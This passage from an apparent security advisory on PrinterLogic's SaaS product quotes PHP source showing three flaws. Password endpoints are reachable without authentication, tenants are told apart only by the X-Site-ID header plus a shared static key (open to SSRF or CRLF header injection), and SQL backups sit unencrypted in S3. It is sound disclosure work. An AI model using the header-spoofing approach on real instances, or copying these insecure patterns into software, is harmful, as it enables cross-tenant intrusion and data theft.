<span style="color: #666666">131</span>             <span style="color: #BA2121">&#39;password&#39;</span> <span style="color: #666666">=&gt;</span> <span style="color: #BA2121">&#39;required_without:hashed_password|string|max:255&#39;</span>,
<span style="color: #666666">132</span>             <span style="color: #BA2121">&#39;hashed_password&#39;</span> <span style="color: #666666">=&gt;</span> <span style="color: #BA2121">&#39;required_without:password|string|max:255&#39;</span>,
<span style="color: #666666">133</span>         ]);
<span style="color: #666666">134</span> 
<span style="color: #666666">135</span>         <span style="color: #408080; font-style: italic">//Create new model and save</span>
<span style="color: #666666">136</span>         <span style="color: #19177C">$password</span> <span style="color: #666666">=</span> <span style="color: #008000; font-weight: bold">new</span> Password;
<span style="color: #666666">137</span> 
<span style="color: #666666">138</span>         <span style="color: #408080; font-style: italic">//Fill Model;</span>
<span style="color: #666666">139</span>         <span style="color: #19177C">$password</span><span style="color: #666666">-&gt;</span><span style="color: #7D9029">fill</span>(<span style="color: #19177C">$validated</span>);
<span style="color: #666666">140</span> 
<span style="color: #666666">141</span>         <span style="color: #408080; font-style: italic">//Save</span>
<span style="color: #666666">142</span>         <span style="color: #19177C">$password</span><span style="color: #666666">-&gt;</span><span style="color: #7D9029">save</span>();
<span style="color: #666666">143</span> 
<span style="color: #666666">144</span>         <span style="color: #008000; font-weight: bold">return</span> response()<span style="color: #666666">-&gt;</span><span style="color: #7D9029">json</span>([<span style="color: #BA2121">&#39;success&#39;</span> <span style="color: #666666">=&gt;</span> <span style="color: #008000; font-weight: bold">true</span>], Response<span style="color: #666666">::</span><span style="color: #7D9029">HTTP_CREATED</span>);
<span style="color: #666666">145</span>     }
<span style="color: #666666">146</span> 
<span style="color: #666666">147</span>     <span style="color: #BA2121; font-style: italic">/**</span>
<span style="color: #BA2121; font-style: italic">148      * Endpoint to update existing password records.</span>
<span style="color: #BA2121; font-style: italic">149      *</span>
<span style="color: #BA2121; font-style: italic">150      * @param Request $request Request Object</span>
<span style="color: #BA2121; font-style: italic">151      * @param String $user_id ID of the user passed from the user service</span>
<span style="color: #BA2121; font-style: italic">152      * @param Int $tenant_id ID of the tenant</span>
<span style="color: #BA2121; font-style: italic">153      *</span>
<span style="color: #BA2121; font-style: italic">154      * @return \Illuminate\Http\JsonResponse</span>
<span style="color: #BA2121; font-style: italic">155      */</span>
<span style="color: #666666">156</span>     <span style="color: #008000; font-weight: bold">public</span> <span style="color: #008000; font-weight: bold">function</span> <span style="color: #0000FF">update</span>(Request <span style="color: #19177C">$request</span>, string <span style="color: #19177C">$user_id</span>, int <span style="color: #19177C">$tenant_id</span>)
<span style="color: #666666">157</span>     {
<span style="color: #666666">158</span>         <span style="color: #408080; font-style: italic">//Validate required fields</span>
<span style="color: #666666">159</span>         <span style="color: #19177C">$validated</span> <span style="color: #666666">=</span> <span style="color: #19177C">$request</span><span style="color: #666666">-&gt;</span><span style="color: #7D9029">validate</span>([
<span style="color: #666666">160</span>             <span style="color: #BA2121">&#39;password&#39;</span> <span style="color: #666666">=&gt;</span> <span style="color: #BA2121">&#39;required||max:255&#39;</span>,
<span style="color: #666666">161</span>         ]);
<span style="color: #666666">162</span> 
<span style="color: #666666">163</span>         <span style="color: #408080; font-style: italic">// Get the record to be updated</span>
<span style="color: #666666">164</span>         <span style="color: #19177C">$password</span> <span style="color: #666666">=</span> Password<span style="color: #666666">::</span><span style="color: #7D9029">firstOrNew</span>([
<span style="color: #666666">165</span>             <span style="color: #BA2121">&#39;user_id&#39;</span> <span style="color: #666666">=&gt;</span> <span style="color: #19177C">$user_id</span>,
<span style="color: #666666">166</span>             <span style="color: #BA2121">&#39;tenant_id&#39;</span> <span style="color: #666666">=&gt;</span> <span style="color: #19177C">$tenant_id</span>,
<span style="color: #666666">167</span>             ]);
<span style="color: #666666">168</span> 
<span style="color: #666666">169</span>         <span style="color: #408080; font-style: italic">//Fill Model;</span>
<span style="color: #666666">170</span>         <span style="color: #19177C">$password</span><span style="color: #666666">-&gt;</span><span style="color: #7D9029">fill</span>(<span style="color: #19177C">$validated</span>);
<span style="color: #666666">171</span> 
<span style="color: #666666">172</span>         <span style="color: #408080; font-style: italic">//Save</span>
<span style="color: #666666">173</span>         <span style="color: #19177C">$password</span><span style="color: #666666">-&gt;</span><span style="color: #7D9029">save</span>();
<span style="color: #666666">174</span> 
<span style="color: #666666">175</span>         <span style="color: #008000; font-weight: bold">return</span> response()<span style="color: #666666">-&gt;</span><span style="color: #7D9029">json</span>([<span style="color: #BA2121">&#39;success&#39;</span> <span style="color: #666666">=&gt;</span> <span style="color: #008000; font-weight: bold">true</span>], Response<span style="color: #666666">::</span><span style="color: #7D9029">HTTP_OK</span>);
<span style="color: #666666">176</span>     }
<span style="color: #666666">177</span> 
<span style="color: #666666">178</span>     <span style="color: #BA2121; font-style: italic">/**</span>
<span style="color: #BA2121; font-style: italic">179      * Endpoint to delete password records</span>
<span style="color: #BA2121; font-style: italic">180      *</span>
<span style="color: #BA2121; font-style: italic">181      * @param String $user_id ID of the user passed from the user service</span>
<span style="color: #BA2121; font-style: italic">182      * @param Int $tenant_id ID of the tenant</span>
<span style="color: #BA2121; font-style: italic">183      *</span>
<span style="color: #BA2121; font-style: italic">184      * @return \Illuminate\Contracts\Foundation\Application|\Illuminate\Contracts\Routing\ResponseFactory|\Illuminate\Http\Response</span>
<span style="color: #BA2121; font-style: italic">185      */</span>
<span style="color: #666666">186</span>     <span style="color: #008000; font-weight: bold">public</span> <span style="color: #008000; font-weight: bold">function</span> <span style="color: #0000FF">destroy</span>(string <span style="color: #19177C">$user_id</span>, int <span style="color: #19177C">$tenant_id</span>)
<span style="color: #666666">187</span>     {
<span style="color: #666666">188</span>         <span style="color: #19177C">$password</span> <span style="color: #666666">=</span> Password<span style="color: #666666">::</span><span style="color: #7D9029">where</span>(<span style="color: #BA2121">&#39;user_id&#39;</span>, <span style="color: #19177C">$user_id</span>)<span style="color: #666666">-&gt;</span><span style="color: #7D9029">where</span>(<span style="color: #BA2121">&#39;tenant_id&#39;</span>, <span style="color: #19177C">$tenant_id</span>)<span style="color: #666666">-&gt;</span><span style="color: #7D9029">firstOrFail</span>();
<span style="color: #666666">189</span>         <span style="color: #19177C">$password</span><span style="color: #666666">-&gt;</span><span style="color: #7D9029">delete</span>();
<span style="color: #666666">190</span>         <span style="color: #008000; font-weight: bold">return</span> response()<span style="color: #666666">-&gt;</span><span style="color: #7D9029">noContent</span>();
<span style="color: #666666">191</span>     }
<span style="color: #666666">192</span> }
</pre></div>

<p>An attacker can interact with the passwords of any user for any tenant without authentication, using the <code>user_id</code> and <code>tenant_id</code> variables which are public.</p>
<p><a id="saas-insecure-design"></a></p>
<h2>Details - Insecure design of the SaaS version</h2>
<p>It was observed that the SaaS version of PrinterLogic has a critical design flaw in the authentication mechanism between the HTTP microservices. It appears that the same infrastructure is running for all the customer instances and a specific tenant ID (extracted from the subdomain or from a specific HTTP header <code>X-Site-ID</code>) is used to differentiate the instances: the microservices communicate over HTTP and mainly use the <code>X-Site-ID</code> HTTP header to authenticate in which instance the actions will take place.</p>
<p>For example, the microservices will use <code>X-Site-ID: client</code> in the internal HTTP requests to change the configuration of the <code>client</code> instance. If <code>X-Site-ID: client2</code> is specified, the actions will take place in the <code>client2</code> instance. </p>
<p>This is a not an authentication mechanism. An attacker finding a SSRF vulnerability or able to add custom HTTP headers in the existing HTTP requests can take control of any instance running in the SaaS version by using the additional HTTP header <code>X-Site-ID: target-instance</code>. </p>
<p>There is also another HTTP header <code>X-Printerlogic-MS-Auth-Key</code> containing a key but from the source code, this HTTP header is identical for all the instances (e.g. <code>client1</code>, <code>client2</code> and any other customer will use the same <code>X-Printerlogic-MS-Auth-Key</code> key).</p>
<p>For example, in the <code>var/www/app/app/Http/Controllers/UserAttributeController.php</code> file, only the <code>X-Site-ID</code> is used to store information regarding the user (coming from the HTTP request):</p>
<p>Content of <code>/var/www/app/app/Http/Controllers/UserAttributeController.php</code> with:</p>
<ul>
<li>line 102: use of the HTTP header <code>X-Site-ID</code>;</li>
<li>lines 134 to 139: creation of a new username and a new badgeId for the the specific tenant defined by the <code>X-Site-ID</code> header.</li>
</ul>
<div class="colorful" style="background: #f8f8f8"><pre style="line-height: 125%"><span></span>  1 <span style="color: #BC7A00">&lt;?php</span>
[<span style="color: #666666">...</span>]
 <span style="color: #666666">84</span>     <span style="color: #008000; font-weight: bold">public</span> <span style="color: #008000; font-weight: bold">function</span> <span style="color: #0000FF">store</span>(UserAttributeRequest <span style="color: #19177C">$request</span>, <span style="color: #19177C">$id</span>)
 <span style="color: #666666">85</span>     {
 <span style="color: #666666">86</span>         <span style="color: #008000; font-weight: bold">try</span> {
 <span style="color: #666666">87</span>             <span style="color: #408080; font-style: italic">// retrieve user</span>
 <span style="color: #666666">88</span>             <span style="color: #19177C">$isIdp</span> <span style="color: #666666">=</span> <span style="color: #19177C">$request</span><span style="color: #666666">-&gt;</span><span style="color: #7D9029">get</span>(<span style="color: #BA2121">&#39;isIdp&#39;</span>, <span style="color: #008000; font-weight: bold">false</span>);
 <span style="color: #666666">89</span>             <span style="color: #19177C">$user</span> <span style="color: #666666">=</span> User<span style="color: #666666">::</span><span style="color: #7D9029">getUserByIdentifier</span>(<span style="color: #19177C">$id</span>, <span style="color: #19177C">$isIdp</span>);
 <span style="color: #666666">90</span> 
 <span style="color: #666666">91</span>             <span style="color: #19177C">$isLdap</span> <span style="color: #666666">=</span> <span style="color: #008000">strtolower</span>(<span style="color: #19177C">$user</span><span style="color: #666666">-&gt;</span><span style="color: #7D9029">source_service_type</span>) <span style="color: #666666">===</span> <span style="color: #BA2121">&quot;ldap&quot;</span>;
 <span style="color: #666666">92</span> 
 <span style="color: #666666">93</span>             <span style="color: #19177C">$attributes</span> <span style="color: #666666">=</span> <span style="color: #19177C">$request</span><span style="color: #666666">-&gt;</span><span style="color: #7D9029">get</span>(<span style="color: #BA2121">&#39;userAttributes&#39;</span>);
 <span style="color: #666666">94</span> 
 <span style="color: #666666">95</span>             <span style="color: #008000; font-weight: bold">foreach</span> (<span style="color: #19177C">$attributes</span> <span style="color: #008000; font-weight: bold">as</span> <span style="color: #19177C">$data</span>) {
 <span style="color: #666666">96</span>                 <span style="color: #408080; font-style: italic">// check to make sure attribute is valid</span>
 <span style="color: #666666">97</span>                 UserAttribute<span style="color: #666666">::</span><span style="color: #7D9029">validateAttribute</span>(<span style="color: #19177C">$data</span>[<span style="color: #BA2121">&#39;attribute&#39;</span>], <span style="color: #19177C">$data</span>[<span style="color: #BA2121">&#39;value&#39;</span>]);
 <span style="color: #666666">98</span> 
 <span style="color: #666666">99</span>                 <span style="color: #408080; font-style: italic">// If a badge id is one of the attributes, fire a add badge event to store badge in legacy pi table</span>
<span style="color: #666666">100</span>                 <span style="color: #008000; font-weight: bold">if</span> (<span style="color: #19177C">$data</span>[<span style="color: #BA2121">&#39;attribute&#39;</span>] <span style="color: #666666">==</span> <span style="color: #BA2121">&#39;badge-id&#39;</span>) {
<span style="color: #666666">101</span>                     <span style="color: #19177C">$missingFields</span> <span style="color: #666666">=</span> <span style="color: #BA2121">&#39;&#39;</span>;
<span style="color: #666666">102</span>                     <span style="color: #19177C">$siteId</span> <span style="color: #666666">=</span> <span style="color: #19177C">$request</span><span style="color: #666666">-&gt;</span><span style="color: #7D9029">header</span>(<span style="color: #BA2121">&#39;X-Site-ID&#39;</span>); <span style="color: #408080; font-style: italic">// [1] - use of the HTTP header X-Site-ID</span>
<span style="color: #666666">103</span>                     <span style="color: #008000; font-weight: bold">if</span> (<span style="color: #008000; font-weight: bold">empty</span>(<span style="color: #19177C">$siteId</span>)) {
<span style="color: #666666">104</span>                         <span style="color: #19177C">$missingFields</span> <span style="color: #666666">.=</span> <span style="color: #BA2121">&#39;site id,&#39;</span>;
<span style="color: #666666">105</span>                     }
<span style="color: #666666">106</span>                     <span style="color: #008000; font-weight: bold">if</span> (<span style="color: #008000; font-weight: bold">empty</span>(<span style="color: #19177C">$user</span><span style="color: #666666">-&gt;</span><span style="color: #7D9029">user_login_name</span>)) {
<span style="color: #666666">107</span>                         <span style="color: #19177C">$missingFields</span> <span style="color: #666666">.=</span> <span style="color: #BA2121">&#39;user login name,&#39;</span>;
<span style="color: #666666">108</span>                     }
<span style="color: #666666">109</span>                     <span style="color: #408080; font-style: italic">// Currently only LDAP requires a domain.</span>
<span style="color: #666666">110</span>                     <span style="color: #008000; font-weight: bold">if</span> (<span style="color: #008000; font-weight: bold">empty</span>(<span style="color: #19177C">$user</span><span style="color: #666666">-&gt;</span><span style="color: #7D9029">domain</span>) <span style="color: #666666">&amp;&amp;</span> <span style="color: #19177C">$isLdap</span>) {
<span style="color: #666666">111</span>                         <span style="color: #19177C">$missingFields</span> <span style="color: #666666">.=</span> <span style="color: #BA2121">&#39;domain,&#39;</span>;
<span style="color: #666666">112</span>                     }
<span style="color: #666666">113</span>                     <span style="color: #008000; font-weight: bold">if</span> (<span style="color: #008000; font-weight: bold">empty</span>(<span style="color: #19177C">$data</span>[<span style="color: #BA2121">&#39;value&#39;</span>])) {
<span style="color: #666666">114</span>                         <span style="color: #19177C">$missingFields</span> <span style="color: #666666">.=</span> <span style="color: #BA2121">&#39;badge id&#39;</span>;
<span style="color: #666666">115</span>                     }
<span style="color: #666666">116</span> 
<span style="color: #666666">117</span>                     <span style="color: #008000; font-weight: bold">if</span> (<span style="color: #666666">!</span><span style="color: #008000; font-weight: bold">empty</span>(<span style="color: #19177C">$missingFields</span>)) {
<span style="color: #666666">118</span>                         <span style="color: #19177C">$missingFields</span> <span style="color: #666666">=</span> <span style="color: #008000">rtrim</span>(<span style="color: #19177C">$missingFields</span>, <span style="color: #BA2121">&#39;,&#39;</span>);
<span style="color: #666666">119</span>                         <span style="color: #19177C">$errorMessage</span> <span style="color: #666666">=</span> <span style="color: #008000">sprintf</span>(
<span style="color: #666666">120</span>                             <span style="color: #BA2121">&#39;Unable to register badge with PI, following fields not set: %s&#39;</span>,
<span style="color: #666666">121</span>                             <span style="color: #19177C">$missingFields</span>
<span style="color: #666666">122</span>                         );
<span style="color: #666666">123</span>                         Log<span style="color: #666666">::</span><span style="color: #7D9029">error</span>(<span style="color: #19177C">$errorMessage</span>);
<span style="color: #666666">124</span>                         <span style="color: #008000; font-weight: bold">return</span> <span style="color: #19177C">$this</span><span style="color: #666666">-&gt;</span><span style="color: #7D9029">errorResponse</span>(
<span style="color: #666666">125</span>                             <span style="color: #19177C">$errorMessage</span>,
<span style="color: #666666">126</span>                             self<span style="color: #666666">::</span><span style="color: #7D9029">FAILED_ATTRIBUTE_SAVE_ERROR</span>
<span style="color: #666666">127</span>                         );
<span style="color: #666666">128</span>                     }
<span style="color: #666666">129</span>                     <span style="color: #19177C">$username</span> <span style="color: #666666">=</span> <span style="color: #19177C">$user</span><span style="color: #666666">-&gt;</span><span style="color: #7D9029">user_login_name</span>;
<span style="color: #666666">130</span>                     <span style="color: #008000; font-weight: bold">if</span> (<span style="color: #19177C">$isLdap</span>) {
<span style="color: #666666">131</span>                         <span style="color: #19177C">$user</span><span style="color: #666666">-&gt;</span><span style="color: #7D9029">replaceDomainWithMsdsDomainIfExists</span>();
<span style="color: #666666">132</span>                         <span style="color: #19177C">$username</span> <span style="color: #666666">=</span> <span style="color: #19177C">$user</span><span style="color: #666666">-&gt;</span><span style="color: #7D9029">domain</span> <span style="color: #666666">.</span> <span style="color: #BA2121">&#39;\\&#39;</span> <span style="color: #666666">.</span> <span style="color: #19177C">$username</span>;
<span style="color: #666666">133</span>                     }
<span style="color: #666666">134</span>                     <span style="color: #19177C">$payload</span> <span style="color: #666666">=</span> [                                 <span style="color: #408080; font-style: italic">// [2] use of the HTTP header X-Site-ID</span>
<span style="color: #666666">135</span>                         <span style="color: #BA2121">&#39;siteId&#39;</span> <span style="color: #666666">=&gt;</span> <span style="color: #19177C">$siteId</span>,
<span style="color: #666666">136</span>                         <span style="color: #BA2121">&#39;username&#39;</span> <span style="color: #666666">=&gt;</span> <span style="color: #19177C">$username</span>,
<span style="color: #666666">137</span>                         <span style="color: #BA2121">&#39;badgeId&#39;</span> <span style="color: #666666">=&gt;</span> <span style="color: #19177C">$data</span>[<span style="color: #BA2121">&#39;value&#39;</span>],
<span style="color: #666666">138</span>                     ];
<span style="color: #666666">139</span>                     event(<span style="color: #008000; font-weight: bold">new</span> AddBadgeEvent(<span style="color: #19177C">$payload</span>));
</pre></div>

<p>The PHP file <code>/var/www/app/api-gateway/Apis/MicroserviceApi.php</code> confirms that the same <code>X-PrinterLogic-MS-Auth-key</code> variable is used in all the instances inside the SaaS version.</p>
<p>Consequently, only 2 variables are used to authenticate a tenant instance inside the SaaS infrastructure:</p>
<ul>
<li><code>X-Site-ID</code>, public value corresponding to the subdomain if the <code>X-Site-ID</code> HTTP header is not set (e.g. <code>client1</code> for the <code>client1</code> instance, <code>client2</code> for the <code>client2</code> instance) - this is the main authentication mechanism;</li>
<li><code>X-PL-Instance-ID</code>, public value corresponding to the tenant ID - this does not seem to be widely used in the source code files.</li>
</ul>
<p>Content of <code>/var/www/app/api-gateway/Apis/MicroserviceApi.php</code> with the headers used on lines 62 and 63:</p>
<div class="colorful" style="background: #f8f8f8"><pre style="line-height: 125%"><span></span>  1 <span style="color: #BC7A00">&lt;?php</span>
[<span style="color: #666666">...</span>]
 <span style="color: #666666">15</span> <span style="color: #BA2121; font-style: italic">/**</span>
<span style="color: #BA2121; font-style: italic"> 16  * Base class for all of the individual microservice APIs</span>
<span style="color: #BA2121; font-style: italic"> 17  */</span>
 <span style="color: #666666">18</span> <span style="color: #008000; font-weight: bold">class</span> <span style="color: #0000FF; font-weight: bold">MicroserviceApi</span>
 <span style="color: #666666">19</span> {
 <span style="color: #666666">20</span>     <span style="color: #008000; font-weight: bold">use</span> ApiResponse;
 <span style="color: #666666">21</span> 
 <span style="color: #666666">22</span>     <span style="color: #008000; font-weight: bold">protected</span> <span style="color: #19177C">$domain</span>;
 <span style="color: #666666">23</span>     <span style="color: #008000; font-weight: bold">protected</span> <span style="color: #19177C">$verifySsl</span>;
 <span style="color: #666666">24</span>     <span style="color: #008000; font-weight: bold">protected</span> <span style="color: #19177C">$siteid</span>;
 <span style="color: #666666">25</span>     <span style="color: #008000; font-weight: bold">protected</span> <span style="color: #19177C">$tenantId</span>;
 <span style="color: #666666">26</span> 
 <span style="color: #666666">27</span>     <span style="color: #BA2121; font-style: italic">/**</span>
<span style="color: #BA2121; font-style: italic"> 28      * Constructor</span>
<span style="color: #BA2121; font-style: italic"> 29      *</span>
<span style="color: #BA2121; font-style: italic"> 30      * @param string $domain - host name of the real endpoint</span>
<span style="color: #BA2121; font-style: italic"> 31      * @param bool $verify - whether to verify SSL connection</span>
<span style="color: #BA2121; font-style: italic"> 32      * @param string $siteIdOverride - if null, then we&#39;ll use the App::getSiteId()</span>
<span style="color: #BA2121; font-style: italic"> 33      */</span>
 <span style="color: #666666">34</span>     <span style="color: #008000; font-weight: bold">public</span> <span style="color: #008000; font-weight: bold">function</span> <span style="color: #0000FF">__construct</span>(<span style="color: #19177C">$domain</span>, <span style="color: #19177C">$verify</span>, <span style="color: #19177C">$siteIdOverride</span> <span style="color: #666666">=</span> <span style="color: #008000; font-weight: bold">null</span>)
 <span style="color: #666666">35</span>     {
 <span style="color: #666666">36</span>         <span style="color: #19177C">$this</span><span style="color: #666666">-&gt;</span><span style="color: #7D9029">domain</span> <span style="color: #666666">=</span> <span style="color: #19177C">$domain</span>;
 <span style="color: #666666">37</span>         <span style="color: #19177C">$this</span><span style="color: #666666">-&gt;</span><span style="color: #7D9029">verifySsl</span> <span style="color: #666666">=</span> <span style="color: #19177C">$verify</span>;
 <span style="color: #666666">38</span>         <span style="color: #19177C">$this</span><span style="color: #666666">-&gt;</span><span style="color: #7D9029">siteid</span> <span style="color: #666666">=</span> <span style="color: #19177C">$siteIdOverride</span> <span style="color: #666666">?</span> <span style="color: #19177C">$siteIdOverride</span> <span style="color: #666666">:</span> App<span style="color: #666666">::</span><span style="color: #7D9029">getSiteId</span>();
 <span style="color: #666666">39</span> 
 <span style="color: #666666">40</span>         <span style="color: #19177C">$catalogService</span> <span style="color: #666666">=</span> app(CatalogService<span style="color: #666666">::</span><span style="color: #7D9029">class</span>);
 <span style="color: #666666">41</span>         <span style="color: #19177C">$tenantId</span> <span style="color: #666666">=</span> <span style="color: #19177C">$catalogService</span><span style="color: #666666">-&gt;</span><span style="color: #7D9029">getCurrentTenantId</span>() <span style="color: #666666">??</span> <span style="color: #BA2121">&#39;&#39;</span>;
 <span style="color: #666666">42</span>         <span style="color: #19177C">$this</span><span style="color: #666666">-&gt;</span><span style="color: #7D9029">tenantId</span> <span style="color: #666666">=</span> (string)<span style="color: #19177C">$tenantId</span>;
 <span style="color: #666666">43</span>     }
 <span style="color: #666666">44</span> 
 <span style="color: #666666">45</span>     <span style="color: #BA2121; font-style: italic">/**</span>
<span style="color: #BA2121; font-style: italic"> 46      * Make the actual request</span>
<span style="color: #BA2121; font-style: italic"> 47      *</span>
<span style="color: #BA2121; font-style: italic"> 48      * @param string $url - relative path of the endpoint (not including hostname)</span>
<span style="color: #BA2121; font-style: italic"> 49      * @param string $method - HTTP method</span>
<span style="color: #BA2121; font-style: italic"> 50      * @param array $request - Request body</span>
<span style="color: #BA2121; font-style: italic"> 51      * @param array $headers - Request headers</span>
<span style="color: #BA2121; font-style: italic"> 52      *</span>
<span style="color: #BA2121; font-style: italic"> 53      * @return Response</span>
<span style="color: #BA2121; font-style: italic"> 54      */</span>
 <span style="color: #666666">55</span>     <span style="color: #008000; font-weight: bold">protected</span> <span style="color: #008000; font-weight: bold">function</span> <span style="color: #0000FF">makeRequest</span>(<span style="color: #19177C">$url</span>, <span style="color: #19177C">$method</span> <span style="color: #666666">=</span> <span style="color: #BA2121">&#39;GET&#39;</span>, <span style="color: #19177C">$request</span> <span style="color: #666666">=</span> [], <span style="color: #19177C">$headers</span> <span style="color: #666666">=</span> [])
 <span style="color: #666666">56</span>     {
 <span style="color: #666666">57</span>         <span style="color: #19177C">$defaultRequest</span> <span style="color: #666666">=</span> [
 <span style="color: #666666">58</span>             <span style="color: #BA2121">&#39;verify&#39;</span> <span style="color: #666666">=&gt;</span> <span style="color: #19177C">$this</span><span style="color: #666666">-&gt;</span><span style="color: #7D9029">verifySsl</span>,
 <span style="color: #666666">59</span>         ];
 <span style="color: #666666">60</span>         <span style="color: #19177C">$defaultHeaders</span> <span style="color: #666666">=</span> [
 <span style="color: #666666">61</span>             <span style="color: #408080; font-style: italic">// headers that come in have been lower-cased, so to merge properly, we must be also</span>
 <span style="color: #666666">62</span>             <span style="color: #BA2121">&#39;x-printerlogic-ms-auth-key&#39;</span> <span style="color: #666666">=&gt;</span> config(<span style="color: #BA2121">&#39;auth.microservice_auth_key&#39;</span>),        <span style="color: #408080; font-style: italic">// [1] static x-printerlogic-ms-auth-key</span>
 <span style="color: #666666">63</span>             <span style="color: #BA2121">&#39;x-site-id&#39;</span> <span style="color: #666666">=&gt;</span> <span style="color: #19177C">$this</span><span style="color: #666666">-&gt;</span><span style="color: #7D9029">siteid</span>,                                                <span style="color: #408080; font-style: italic">// [2] subdomain or value extracted from the X-Site-ID HTTP header</span>
 <span style="color: #666666">64</span>             <span style="color: #BA2121">&#39;X-PL-Instance-ID&#39;</span> <span style="color: #666666">=&gt;</span> <span style="color: #19177C">$this</span><span style="color: #666666">-&gt;</span><span style="color: #7D9029">tenantId</span>,
 <span style="color: #666666">65</span>         ];
 <span style="color: #666666">66</span> 
 <span style="color: #666666">67</span>         <span style="color: #19177C">$request</span> <span style="color: #666666">=</span> <span style="color: #008000">array_merge</span>(<span style="color: #19177C">$defaultRequest</span>, <span style="color: #19177C">$request</span>);
 <span style="color: #666666">68</span>         <span style="color: #19177C">$request</span>[<span style="color: #BA2121">&#39;headers&#39;</span>] <span style="color: #666666">=</span> <span style="color: #008000">array_merge</span>(<span style="color: #19177C">$defaultHeaders</span>, <span style="color: #19177C">$headers</span>);
 <span style="color: #666666">69</span>         <span style="color: #19177C">$url</span> <span style="color: #666666">=</span> <span style="color: #19177C">$this</span><span style="color: #666666">-&gt;</span><span style="color: #7D9029">domain</span> <span style="color: #666666">.</span> <span style="color: #19177C">$url</span>;
 <span style="color: #666666">70</span> 
 <span style="color: #666666">71</span>         Log<span style="color: #666666">::</span><span style="color: #7D9029">debug</span>(<span style="color: #008000">sprintf</span>(<span style="color: #BA2121">&#39;[API-Gateway] %s %s&#39;</span>, <span style="color: #19177C">$method</span>, <span style="color: #19177C">$url</span>));
 <span style="color: #666666">72</span>         <span style="color: #19177C">$client</span> <span style="color: #666666">=</span> <span style="color: #008000; font-weight: bold">new</span> Client();
 <span style="color: #666666">73</span>         <span style="color: #19177C">$response</span> <span style="color: #666666">=</span> <span style="color: #19177C">$client</span><span style="color: #666666">-&gt;</span><span style="color: #7D9029">request</span>(<span style="color: #19177C">$method</span>, <span style="color: #19177C">$url</span>, <span style="color: #19177C">$request</span>);
 <span style="color: #666666">74</span> 
 <span style="color: #666666">75</span>         <span style="color: #008000; font-weight: bold">return</span> <span style="color: #19177C">$response</span>;
 <span style="color: #666666">76</span>     }
</pre></div>

<p>For example, the edition of a user is entirely based on the <code>X-Site-ID</code> variable in the HTTP request in the <code>/var/www/app/app/Http/Controllers/UserController.php</code> file:</p>
<p>Content of <code>/var/www/app/app/Http/Controllers/UserController.php</code>:</p>
<pre>
[...]
 456     /** 
 457      * Store a newly created resource in storage.
 458      *      
 459      * @param UserRequest $request User data to store
 460      *  
 461      * @return \Illuminate\Http\Response | \Illuminate\Http\JsonResponse
 462      *
 463      * @throws InvalidAttributeIdException
 464      * @throws InvalidAttributeKeyException
 465      * @throws InvalidAttributeValueException
 466      * @throws UserAttributeSaveException
 467      */
 468     public function store(UserRequest $request)
 469     {
<font color=red> 470         $data = $request->get('user');</font>
 471 
 472         // convert all data to snake case
 473         $data = StringHelper::toSnakeCase($data, true);
 474         
<font color=red> 475         $data['site_id'] = $request->header(CustomHttpHeaders::HEADER_SITE_ID);</font>
 476                     
<font color=red> 477         // create the user 
 478         $user = $this->service->create($data);</font>
 479         $response = fractal()->create()
 480             ->item($user)
 481             ->transformWith(new UserTransformer())
 482             ->withResourceName('user')
 483             ->toArray();
 484         
 485         return response()->json($response, HttpResponse::HTTP_CREATED);
 486     }
[...]
 548     /**
 549      * Update the specified resource in storage.
 550      *
 551      * @param UserRequest $request User data to update
 552      * @param int         $id Id of user to update
 553      *
 554      * @return \Illuminate\Http\Response | array
 555      */
 556     public function update(UserRequest $request, $id)
 557     {
<font color=red> 558         $data = $request->get('user');
 559         $data['site_id'] = $request->header(CustomHttpHeaders::HEADER_SITE_ID);</font>
 560         $allowUpsert = $request->header('X-PrinterLogic-AllowUpsert', false);
 561 
 562         // Check user record exists in table before trying to update it
 563         $user = User::where('id', $id)->first();
 564         if (!$user && $allowUpsert) {
 565             Log::debug(sprintf('Record [%s] does not exist, upserting user.', $id));
 566             return $this->store($request);
 567         } elseif (!$user) {
 568             return $this->errorResponse(
 569                 sprintf('Record [%s] does not exist.', $id),
 570                 'INVALID-USER',
 571                 HttpResponse::HTTP_NOT_FOUND
 572             );
 573         }
 574 
<font color=red> 575         $user = $this->service->update($id, $data);</font>
 576 
 577         return fractal()->create()
 578             ->item($user)
 579             ->transformWith(new UserTransformer())
 580             ->withResourceName('user')
 581             ->toArray();
 582     }
</pre>

<p>An attacker with SSRF vulnerabilities or able to add additional HTTP headers in the internal request (e.g. by including CRLF characters) can control any instance.</p>
<p>There is a high risk of cross-tenant vulnerabilities since the authentication mechanism of instances seems to be weak.</p>
<p><a id="saas-clear-text-sql-backups"></a></p>
<h2>Details - SQL Backups stored in clear-text in the Cloud</h2>
<p>It was observed that backup files are stored in clear-text inside the <code>s3DbBackup</code> AWS Bucket.</p>
<p>The tarball is generated from the <code>/var/www/app/Console/Commands/BackupPrinterInstaller.php</code> PHP script on line 54 and uploaded into the <code>s3DbBackup</code> AWS Bucket on line 62.</p>
<p>There is no encryption, the SQL dump is just gzipped on line 54:</p>
<p>Content of <code>/var/www/app/Console/Commands/BackupPrinterInstaller.php</code>:</p>
<pre>
 22 class BackupPrinterInstaller extends Command
 23 {
 24     /**
 25      * The name and signature of the console command. It needs which database to backup and a unique key to be passed.
 26      *
 27      * @var string
 28      */
 29     protected $signature = 'printer-logic:backup-printer-installer {schema} {unique_key}';
 30 
 31     /**
 32      * The console command description.
 33      *
 34      * @var string
 35      */
 36     protected $description = 'Backup the Printer Installer Database';
 37 
 38     /**
 39      * Execute the console command.
 40      *
 41      * @return void
 42      */
 43     public function handle()
 44     {
 45         $schema = $this->argument('schema');
 46         $uniqueKey = $this->argument('unique_key');
 47         $file = $schema . "_" . $uniqueKey . "_database.sql.gz";
 48         $fileHandle = null;
 49 
 50         Log::notice("COMMAND START: " . implode(",", $this->arguments()));
 51         try {
 52             $this->info("Initiating Database backup for ... $schema");
 53 
<font color=red> 54             $dumper = $this->createMySqlDbDumper($schema);
 55             $dumper->useCompressor(new GzipCompressor())
 56             ->addExtraOption('--set-gtid-purged=OFF')
 57             ->dumpToFile($file);</font>
 58 
 59             // Open the file stream to avoid loading the entire file into memory at once.
 60             $fileHandle = fopen($file, 'r');
 61             // Save to S3
<font color=red> 62             $success = Storage::disk('s3DbBackup')->put($file, $fileHandle);
 63             Log::debug("Did upload to s3 work? $success");</font>
 64             if (!$success) {
 65                 throw new AwsException("Failed to save $schema to S3", 424);
 66             }
[...]
 81 
 82     /**
 83      * Function createMySqlDbDumper This creates a PrinterLogicMySql object that is ready to be used doing
 84      *  all the necessary setup. MySql inherits from DbDumper and is the MySql implementation of DbDumper.
 85      *
 86      * @param string $dbName Name of database to backup
 87      *
 88      * @return DbDumper
